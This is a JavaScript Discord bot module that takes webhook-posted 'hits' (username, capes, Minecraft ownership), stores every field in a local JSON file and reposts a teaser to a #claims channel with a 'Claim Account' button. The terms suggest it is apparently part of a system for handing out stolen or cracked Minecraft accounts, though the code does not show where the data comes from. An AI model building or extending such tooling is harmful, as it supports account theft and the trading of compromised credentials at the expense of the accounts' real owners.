const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const fs = require('fs');
const path = require('path');

const dbPath = path.join(process.cwd(), 'database.json');

// Helper to initialize the JSON database if it doesn't exist
function initDB() {
  if (!fs.existsSync(dbPath)) {
    fs.writeFileSync(dbPath, JSON.stringify({ hits: {} }, null, 2));
  }
}

class HitsManager {
  static async processHitsEmbed(message, client) {
    try {
      console.log(`⚙️ [HitsManager] Analyzing message sequence... Waiting for API settlement...`);

      setTimeout(async () => {
        const fetchedMessage = await message.channel.messages.fetch(message.id).catch(() => null);
        
        if (!fetchedMessage) {
          console.error('❌ [HitsManager Error] Could not refetch the message payload from Discord API.');
          return;
        }

        if (!fetchedMessage.embeds.length) return;

        const embed = fetchedMessage.embeds[0];
        // Use the raw message ID as our unique database key
        const accountId = fetchedMessage.id; 

        // 1. Scrub and extract all data from the webhook
        const fields = {};
        if (embed.fields && embed.fields.length > 0) {
          embed.fields.forEach(field => {
            const cleanedValue = field.value
              .replace(/```/g, '')
              .replace(/`/g, '')
              .replace(/\\r\\n/g, '')
              .replace(/\\n/g, '')
              .replace(/\n/g, '')
              .trim();
            
            fields[field.name.trim()] = cleanedValue;
          });
        }

        const extractedUsername = fields['Username'];
        const extractedCapes = fields['Capes'] || 'N/A';
        const extractedRank = fields['Rank'] || fields['Owns MC'] || 'N/A';

        if (!extractedUsername) {
          console.error('❌ [HitsManager Error] "Username" returned empty. Aborting routing.');
          return;
        }

        // 2. SAVE EVERYTHING TO JSON DB
        initDB();
        const db = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
        db.hits[accountId] = fields; // Store all scrubbed data directly into the JSON
        fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));

        // 3. Generate the visual embed for #claims
        const claimEmbed = new EmbedBuilder()
          .setColor('#8B0000')
          .setTitle('New Hit Detected!')
          .setThumbnail(`https://mc-heads.net/avatar/steve`)
          .addFields(
            { name: 'Username', value: `\`\`\`Hidden\`\`\`` },
            { name: 'Capes', value: `\`\`\`${extractedCapes}\`\`\`` },
            { name: 'Own Mc?', value: `\`\`\`${extractedRank}\`\`\`` }
          )
          .setTimestamp();

        // Button only needs the accountId to look up data in the JSON
        const claimButton = new ActionRowBuilder().addComponents(
          new ButtonBuilder()
            .setCustomId(`claim_${accountId}`) 
            .setLabel('Claim Account')
            .setStyle(ButtonStyle.Success)
        );

        const claimsChannel = client.channels.cache.get(process.env.CLAIMS_CHANNEL_ID);
        if (!claimsChannel) return;

        const sentMessage = await claimsChannel.send({ embeds: [claimEmbed], components: [claimButton] });
        console.log(`✅ [HitsManager Success] Dispatched to #claims. Message ID: ${sentMessage.id}`);

        await fetchedMessage.react('✅').catch(() => null);

      }, 1500);

    } catch (error) {
      console.error('❌ Critical failure caught within processHitsEmbed:', error);
    }
  }
}

module.exports = HitsManager;
